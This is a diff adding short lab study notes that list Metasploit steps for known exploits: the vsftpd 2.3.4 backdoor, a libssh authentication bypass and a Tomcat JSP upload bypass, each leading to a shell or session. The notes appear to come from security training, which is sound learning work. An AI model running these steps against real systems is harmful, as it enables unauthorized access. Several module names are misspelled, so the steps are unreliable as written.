@@ -1,3 +1,19 @@
+aug 11 - 
+1) vsftpd backdoor
+	port 21 ftp vulnerable for vsftpd 2.3.4
+	module name: exploit/unix/ftp/vstfpd_234_backdoor 
+	only needs rhosts, then run
+
+2) ssh auth bypass 
+	ssh open over port 22
+	use auxiliart/scanner/ssh/libssh_auth_bypass
+	set spawn_bty true (opens up a session)
+	sessions -i 1 (to foreground the session target)
+
+3) tomcat jsp bypass
+	apache tomcat 8.5.19 over port 8080 tcp	
+	use exploit/multi/http/tomcat_jsp_upload_bypass
+	needs rhosts, then run, open shell
 
 aug 10 - 3 labs,
 1) xdebug vector - over port 80, if a dirb scan shows sdebug being used, it's a possible backdoor into a meterpreter session
